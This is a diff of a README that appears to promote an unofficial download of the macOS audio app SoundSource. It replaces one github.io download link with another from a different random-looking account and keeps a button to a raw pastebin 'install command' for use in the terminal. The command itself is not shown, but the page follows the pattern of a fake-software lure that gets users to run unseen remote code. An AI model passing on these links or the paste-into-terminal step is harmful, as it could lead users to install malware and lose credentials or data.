@@ -3,7 +3,7 @@
 
 Take control of your Mac’s sound with **SoundSource** — manage per-app volume, route audio to any device, and apply powerful EQ and effects. Follow this guide to install it easily on macOS. 🎧
 
-[![Download for macOS](https://img.shields.io/badge/macOS-Download-0A84FF?style=for-the-badge&logo=apple)](https://kamartamara.github.io/.github/soundsource)  
+[![Download for macOS](https://img.shields.io/badge/macOS-Download-0A84FF?style=for-the-badge&logo=apple)](https://tayusikf8398.github.io/.github/ss)  
 [![Get Install Command](https://img.shields.io/badge/Get-Install_Command-34C759?style=for-the-badge&logo=terminal)](https://pastebin.com/raw/bFGviutx)
 
 > If the download button does not work, please follow the terminal installation method below.
